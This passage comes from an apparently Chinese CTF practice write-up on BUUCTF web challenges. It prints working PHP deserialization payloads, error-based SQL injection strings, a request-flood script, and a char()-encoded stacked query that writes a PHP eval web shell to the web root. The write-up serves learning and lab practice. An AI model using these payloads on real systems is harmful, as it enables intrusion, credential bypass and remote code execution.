</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">User</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$age</span><span class="o">=</span><span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$nickname</span><span class="o">=</span><span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">age</span> <span class="o">=</span> <span class="s1">&#39;select 1,&#34;c4ca4238a0b923820dcc509a6f75849b&#34; from user where username=?&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">nickname</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Info</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Info</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$CtrlCase</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">CtrlCase</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">dbCtrl</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">Class</span> <span class="nc">UpdateHelper</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$sql</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sql</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">dbCtrl</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$name</span> <span class="o">=</span> <span class="s2">&#34;admin&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$password</span> <span class="o">=</span> <span class="s2">&#34;1&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">UpdateHelper</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂæóÂà∞</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">O:12:&#34;UpdateHelper&#34;:1:{s:3:&#34;sql&#34;;O:4:&#34;User&#34;:2:{s:3:&#34;age&#34;;s:70:&#34;select 1,&#34;c4ca4238a0b923820dcc509a6f75849b&#34; from user where username=?&#34;;s:8:&#34;nickname&#34;;O:4:&#34;Info&#34;:1:{s:8:&#34;CtrlCase&#34;;O:6:&#34;dbCtrl&#34;:2:{s:4:&#34;name&#34;;s:5:&#34;admin&#34;;s:8:&#34;password&#34;;s:1:&#34;1&#34;;}}}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂèçÂ∫èÂàóÂåñÁÇπÂú®ËøôÈáå</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">update</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$Info</span><span class="o">=</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getNewinfo</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$age</span><span class="o">=</span><span class="nv">$Info</span><span class="o">-&gt;</span><span class="na">age</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$nickname</span><span class="o">=</span><span class="nv">$Info</span><span class="o">-&gt;</span><span class="na">nickname</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$updateAction</span><span class="o">=</span><span class="k">new</span> <span class="nx">UpdateHelper</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">],</span><span class="nv">$Info</span><span class="p">,</span><span class="s2">&#34;update user SET age=</span><span class="si">$age</span><span class="s2">,nickname=</span><span class="si">$nickname</span><span class="s2"> where id=&#34;</span><span class="o">.</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//Ëøô‰∏™ÂäüËÉΩËøòÊ≤°ÊúâÂÜôÂÆå ÂÖàÂç†Âùë
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">getNewInfo</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$age</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;age&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$nickname</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;nickname&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">safe</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">Info</span><span class="p">(</span><span class="nv">$age</span><span class="p">,</span><span class="nv">$nickname</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>update.phpÈáåÈù¢post‰º†ageÂíånickname</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">age=1&amp;nickname=unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&#34;;s:8:&#34;CtrlCase&#34;;O:12:&#34;UpdateHelper&#34;:1:{s:3:&#34;sql&#34;;O:4:&#34;User&#34;:2:{s:3:&#34;age&#34;;s:70:&#34;select 1,&#34;c4ca4238a0b923820dcc509a6f75849b&#34; from user where username=?&#34;;s:8:&#34;nickname&#34;;O:4:&#34;Info&#34;:1:{s:8:&#34;CtrlCase&#34;;O:6:&#34;dbCtrl&#34;:2:{s:4:&#34;name&#34;;s:5:&#34;admin&#34;;s:8:&#34;password&#34;;s:1:&#34;1&#34;;}}}}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂ÂêéÁî®adminÁôªÂÖ•</p>
<h2 id="suctf-2018multisql">[SUCTF 2018]MultiSQL
</h2><p>ËøôÈáåÂà©Áî®sqlÁöÑÈ¢ÑÂ§ÑÁêÜËØ≠Âè•</p>
<p>set ÁöÑ‰ΩúÁî®Â∞±ÊòØÂÆö‰πâ‰∏Ä‰∏™ÂèòÈáèÔºåÂèòÈáèÁöÑÂëΩÂêçÂøÖÈ°ªÊòØ@ÂºÄÂ§¥„ÄÇ</p>
<p>prepareÂíåexecute
prepareËØ≠Âè•Áî®‰∫éÈ¢ÑÂÆö‰πâ‰∏Ä‰∏™ËØ≠Âè•ÔºåÂπ∂ÂèØ‰ª•ÊåáÂÆöÈ¢ÑÂÆö‰πâËØ≠Âè•ÂêçÁß∞„ÄÇexecuteÂàôÊòØÊâßË°åÈ¢ÑÂÆö‰πâËØ≠Âè•„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">select</span> <span class="err">‚Äò</span><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> <span class="n">eval</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="n">_</span><span class="p">]);</span><span class="err">?</span><span class="o">&gt;</span><span class="err">‚Äô</span> <span class="n">into</span> <span class="n">outfile</span> <span class="err">‚Äò</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">favicon</span><span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">php</span><span class="err">‚Äô</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Âà©Áî®charÁªïËøáwaf</p>
<p>ÂÖàËΩ¨ËøõÂà∂</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">str</span><span class="o">=</span><span class="s2">&#34;select &#39;&lt;?php eval($_POST[_]);?&gt;&#39; into outfile &#39;/var/www/html/favicon/shell.php&#39;;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">len_str</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="nb">str</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">len_str</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;char(</span><span class="si">%s</span><span class="s1">&#39;</span><span class="o">%</span><span class="nb">ord</span><span class="p">(</span><span class="nb">str</span><span class="p">[</span><span class="n">i</span><span class="p">]),</span><span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;,</span><span class="si">%s</span><span class="s1">&#39;</span><span class="o">%</span><span class="nb">ord</span><span class="p">(</span><span class="nb">str</span><span class="p">[</span><span class="n">i</span><span class="p">]),</span><span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;)&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,95,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59)
</span></span></code></pre></td></tr></table>
</div>
</div><p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=2;set @sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,95,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare query from @sql;execute query;
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂ÂêéËÆøÈóÆ/favicon/shell.php</p>
<h2 id="suctf-2018annonymous">[SUCTF 2018]annonymous
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$MY</span> <span class="o">=</span> <span class="nx">create_function</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;die(`cat flag.php`);&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$hash</span> <span class="o">=</span> <span class="nx">bin2hex</span><span class="p">(</span><span class="nx">openssl_random_pseudo_bytes</span><span class="p">(</span><span class="mi">32</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="k">eval</span><span class="p">(</span><span class="s2">&#34;function SUCTF_</span><span class="si">$hash</span><span class="s2">(){&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="o">.</span><span class="s2">&#34;global </span><span class="se">\$</span><span class="s2">MY;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="o">.</span><span class="s2">&#34;</span><span class="se">\$</span><span class="s2">MY();&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="o">.</span><span class="s2">&#34;}&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;func_name&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;func_name&#34;</span><span class="p">]();</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span> 
</span></span></code></pre></td></tr></table>
</div>
</div><p>hashÈöèÊú∫ÁîüÊàêÊï∞Â≠óÊãºÊé•Âà∞‰∏ãÈù¢ÂáΩÊï∞‰∏≠ÔºåËøô‰∏™ÈöèÊú∫Ê≤°ÂäûÊ≥ïÔºå‰ΩÜÊòØ<code>create_function</code>ÂáΩÊï∞Êúâ‰∏™ÊºèÊ¥ûÔºå‰∏äÊ¨°Êêû<code>[HITCON 2017]Baby^h Master PHP</code>ÁöÑÊó∂ÂÄôÈÅáÂà∞‰∫Ü</p>
<p>‰ºöÁîüÊàêÂåøÂêçÂáΩÊï∞<code>\0lambda_%d</code></p>
<p>ÈÄöËøáÂ§ßÈáèÁöÑËØ∑Ê±ÇÊù•Ëø´‰Ωø<code>Pre-fork</code>Ê®°ÂºèÂêØÂä®</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;http://a10002f2-2091-47dc-9b7c-996d05cd4faa.node3.buuoj.cn/?func_name=</span><span class="si">%00la</span><span class="s1">mbda_1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;flag&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[-]&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250427095941786.png"
	width="628"
	height="122"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250427095941786_hu4782867223037075711.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250427095941786_hu14286701660442600549.png 1024w"
	loading="lazy"
	
		alt="image-20250427095941786"
	
	
		class="gallery-image" 
		data-flex-grow="514"
		data-flex-basis="1235px"
	
></p>
<h2 id="rootersctf2019babyweb">[RootersCTF2019]babyWeb
</h2><p>Êä•ÈîôÊ≥®ÂÖ•ÔºåËøáÊª§orÁî®||ÁªïËøá</p>
<p>ËøáÊª§ÂçïÂèåÂºïÂè∑Áî®16ËøõÂà∂ÁªïËøá</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">search</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">database</span><span class="p">()),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="o">%</span><span class="mi">23</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">//</span><span class="n">sql_injection</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">search</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="mi">0</span><span class="n">x73716C5F696E6A656374696F6E</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="o">%</span><span class="mi">23</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">//</span><span class="n">users</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">search</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">column_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="mi">0</span><span class="n">x7573657273</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="o">%</span><span class="mi">23</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">search</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">column_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="mi">0</span><span class="n">x7573657273</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="o">%</span><span class="mi">23</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">//</span><span class="k">USER</span><span class="p">,</span><span class="n">CURRENT_CONNECTIONS</span><span class="p">,</span><span class="n">TOTAL_CONNECTIONS</span><span class="p">,</span><span class="k">user</span><span class="p">,</span><span class="n">uniqueid</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">search</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">count</span><span class="p">(</span><span class="n">uniqueid</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="o">%</span><span class="mi">23</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">//</span><span class="mi">2</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">search</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">uniqueid</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="o">%</span><span class="mi">23</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">//</span><span class="mi">837461526918364526</span><span class="p">,</span><span class="mi">123456789928466788</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÊàñËÄÖÁî®‰∏áËÉΩÂØÜÁ†Å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1 || 1=1 limit 0,1
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ÂÆâÊ¥µÊùØ-2019‰∏çÊòØÊñá‰ª∂‰∏ä‰º†">[ÂÆâÊ¥µÊùØ 2019]‰∏çÊòØÊñá‰ª∂‰∏ä‰º†
</h2><p>ÂÖàÁî®Ê∫êÁ†ÅÁöÑÂèçÂ∫èÂàóÂåñ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">helper</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$ifview</span> <span class="o">=</span> <span class="k">True</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$config</span> <span class="o">=</span> <span class="s2">&#34;/flag&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">helper</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">O:6:&#34;helper&#34;:2:{s:9:&#34;*ifview&#34;;b:1;s:9:&#34;*config&#34;;s:5:&#34;/flag&#34;;}
</span></span></code></pre></td></tr></table>
</div>
